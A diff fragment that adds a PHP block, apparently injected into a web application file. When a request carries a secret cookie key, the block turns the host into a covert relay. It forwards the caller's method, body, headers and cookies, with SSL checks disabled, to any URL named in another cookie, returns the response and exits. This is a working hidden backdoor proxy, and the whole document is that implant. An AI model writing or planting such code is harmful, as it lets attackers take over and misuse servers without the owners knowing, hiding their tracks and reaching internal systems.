@@ -1,0 +1,112 @@
+if ($_COOKIE["_k"] == "INSERT_KEY") {
+	if (!defined("MIDNIGHT")) {
+		define("MIDNIGHT", 1);
+		ini_set("display_errors", "1");
+		error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
+		function request($url, $method, $body = null, $headers = null)
+		{
+			if (!function_exists("curl_init")) {
+				if(ini_get("allow_url_fopen")) {
+					$opts_array = array(
+						"method" => $method,
+					);
+					if ($headers !== null) $opts_array["header"] = $headers;
+					if ($method !== "GET" && $body !== null) {
+						$opts_array["content"] = $body;
+					}
+					$opts = array("http" => $opts_array);
+					$context = stream_context_create($opts);
+					$req = file_get_contents($url, false, $context);
+					$response = array();
+					$response["body"] = $req;
+					$response["headers"] = $http_response_header;
+					return $response;
+				} else {
+					return false;
+				}
+			}
+
+			$ch = curl_init();
+
+			if ($method === "POST") {
+				curl_setopt($ch, CURLOPT_POST, 1);
+				if ($body !== null) curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
+			}
+
+			curl_setopt($ch, CURLOPT_URL, $url);
+			curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+			curl_setopt($ch, CURLOPT_TIMEOUT, 300);
+			curl_setopt($ch, CURLOPT_HEADER, true);
+
+			if ($headers !== null) curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
+
+			$req = curl_exec($ch);
+			if ($req !== false) {
+				$response = array();
+				$header_size = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
+				$response["headers"] = array_filter(explode("\r\n", substr($req, 0, $header_size)));
+				$response["body"] = substr($req, $header_size);
+				return $response;
+			} else {
+				return false;
+			}
+		}
+
+		if (!function_exists("getallheaders"))  {
+    		function getallheaders()
+    		{
+    		    if (!is_array($_SERVER)) {
+    		        return array();
+    		    }
+    		    $headers = array();
+    		    foreach ($_SERVER as $name => $value) {
+    		        if (substr($name, 0, 5) == "HTTP_") {
+    		            $headers[str_replace(" ", "-", ucwords(strtolower(str_replace("_", " ", substr($name, 5)))))] = $value;
+    		        }
+    		    }
+    		    return $headers;
+    		}
+		}
+		$assoc_headers = getallheaders();
+		$body = file_get_contents("php://input");
+		$headers = array();
+		$url_parts = parse_url($_COOKIE["_u"]);
+		foreach ($assoc_headers as $key => $value) {
+			switch (strtolower($key)) {
+				case "host":
+					$headers []= "Host: " . $url_parts["host"];
+					break;
+				case "cookie":
+					$cookies = $_COOKIE;
+					unset($cookies["_u"]);
+					unset($cookies["_k"]);
+					if (!empty($cookies)) {
+						$i = 0;
+						$items_count = count($cookies);
+						$cookies_str = "";
+						foreach ($cookies as $k => $v) {
+							$cookies_str .= "$k=$v";
+							if (++$i !== $items_count) {
+								$cookies_str .= "; ";
+							}
+						}
+						$headers []= "Cookie: $cookies_str";
+					}
+					break;
+				default:
+					$headers []= "$key: $value";
+					break;
+			}
+		}
+		$req = request($_COOKIE["_u"], $_SERVER["REQUEST_METHOD"], $body ? $body : null, $headers);
+		if ($req) {
+			foreach ($req["headers"] as $header) header($header);
+			echo $req["body"];
+		} else {
+			http_response_code(202);
+		}
+		die();
+	}
+}
